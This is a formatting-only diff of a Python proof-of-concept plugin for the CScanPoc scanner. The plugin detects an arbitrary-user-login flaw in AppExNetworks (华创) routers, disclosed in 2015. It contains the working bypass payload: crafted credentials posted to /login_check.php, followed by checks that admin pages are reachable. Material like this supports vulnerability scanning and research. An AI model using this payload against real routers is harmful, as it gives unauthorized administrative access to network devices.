@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'AppExNetworks_0001' # 平台漏洞编号，留空
+    vuln_id = 'AppExNetworks_0001'  # 平台漏洞编号，留空
     name = '华创路由器可任意用户登录'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = '2015-08-14'  # 漏洞公布时间
     desc = '''
         华创智能加速路由器，设计缺陷，逻辑错误。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '华创路由器'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'a67f00e7-9567-43d4-863f-b25499a520c0'
@@ -31,17 +33,17 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #__refer__  = http://www.wooyun.org/bugs/wooyun-2010-0132543
+
+            # __refer__  = http://www.wooyun.org/bugs/wooyun-2010-0132543
             hh = hackhttp.hackhttp()
             post = "userName=line&password=line%26"
-            posturl =  "/login_check.php"
+            posturl = "/login_check.php"
             target = self.target + posturl
-            code, head, res, errcode, _ = hh.http(target,post=post)
+            code, head, res, errcode, _ = hh.http(target, post=post)
             if code == 302 and "location: redirect.php" in head:
                 code, head, res, errcode, _ = hh.http(self.target)
-                if code == 200  and "acc/network/network_interfaces.php" in res and 'acc/stats/system.php' in res:
-                    #security_hole(target)
+                if code == 200 and "acc/network/network_interfaces.php" in res and 'acc/stats/system.php' in res:
+                    # security_hole(target)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
@@ -50,6 +52,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
